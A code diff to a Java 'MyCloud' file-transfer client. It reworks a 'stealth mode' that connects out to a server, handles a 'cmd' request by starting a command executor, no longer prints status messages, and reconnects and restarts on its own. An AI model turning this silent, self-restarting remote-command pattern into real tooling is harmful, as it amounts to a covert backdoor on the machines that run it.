@@ -14,16 +14,19 @@ import java.util.Scanner;
  class Client
 {
 
-        public InputStream input;
-        public OutputStream output;
-        private Socket socket;
-        private String path=System.getProperty("user.home") + "/Desktop";
-        /*
-        this constructor will be called by the server and it doesn't create a folder for the client either on the server side or the client's side
-         */
-        Client(Socket socket)
+    private InputStream input;
+    private OutputStream output;
+    private Socket socket;
+    private String path=System.getProperty("user.home") + "/Desktop";
+    private boolean Server;
+    /*
+     this constructor will be called by the server and it doesn't create a folder for the client either on the server side or the client's side
+    */
+    Client(Socket socket,boolean Server)
     {
         connect(socket);
+        //Server specify whether this client is running on the Server side or Client side
+        this.Server = Server;
     }
     /*
     this constructor will be called by the client where he can specify the name of the folder on his desktop
@@ -82,7 +85,7 @@ import java.util.Scanner;
         /*
             listen for requests and handle them , "just some test cases here for files transfer"
          */
-        void listen()
+        int listen()
     {
         String request;
         String next;
@@ -126,7 +129,7 @@ import java.util.Scanner;
                     //close connection
                     case "close":
                         close();
-                        break;
+                        return 0;
                     case "cmd":
                         new Executor(new String[]{System.getProperty("os.name"),System.getProperty("user.home")},this);
                         break;
@@ -136,8 +139,12 @@ import java.util.Scanner;
                 }
                 scan.close();
             }
+            return 0;
+            //if Server goes down will try to restart this client if it was running on the Client side
         } catch (Exception e) {
-            e.printStackTrace();
+            //close streams if any is still open
+            close();
+            return -1;
         }
     }
         /*
@@ -216,15 +223,25 @@ import java.util.Scanner;
         /*
             close the connection for this client
          */
-        void close() throws IOException
+        void close()
         {
-        output.close();
-        input.close();
-        socket.close();
+            //put each close statement in a try catch so we make sure all unclosed to close :p
+            try {
+                output.close();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            try {
+                input.close();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            try {
+                socket.close();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
         }
-
-    //    String getId()
-    //    {return id;}
 
         void setPath(String path)
         {this.path=path;}
@@ -239,7 +256,7 @@ import java.util.Scanner;
         {
             try
             {
-                String[] valids = new String[]{"get","upload","get-dir","upload-dir",""};
+                String[] valid = new String[]{"get","upload","get-dir","upload-dir",""};
                 //if Scanner crash then the protocol is not fulfilled
                 Scanner scan = new Scanner(command);
                 String token;
@@ -328,19 +345,28 @@ import java.util.Scanner;
     /*
     Run this client in stealth mode where you can only listen to Server and execute the requests
      */
-        static void stealth(String[] args) throws Exception {
-            System.out.println("Welcome to MyCloud\nTrying to connect");
-            Socket sock = new Socket(args[0], Integer.parseInt(args[1]));
-            //init client and the download folder
-            Client client = new Client(sock, "MyCloud");
-            System.out.println("connected!");
-            //auth with server
+        private static int stealth(String[] args) throws Exception {
+            //keep attempting to connect if connection is refused #ServerIsOffline
+            Socket sock=null;
+            while(sock==null)
+            try {
+                sock = new Socket(args[0], Integer.parseInt(args[1]));
+            } catch (IOException e) {
+                Thread.sleep(1000);
+                continue;
+            }
+            //init client
+            Client client = new Client(sock, false);
+            //auth with server "Send the echo message back"
             client.sendMsg(client.getRequest());
-            client.listen();
+            return client.listen();
         }
 
     public static void main (String[]args)throws Exception
     {
-        stealth(new String[]{args[0],"1234"});
+        int integer;
+        integer = stealth(new String[]{"localhost","1234"});
+        // try again if connection is not closed normally
+        while(integer==-1) integer = stealth(new String[]{"localhost", "1234"});
     }
     }
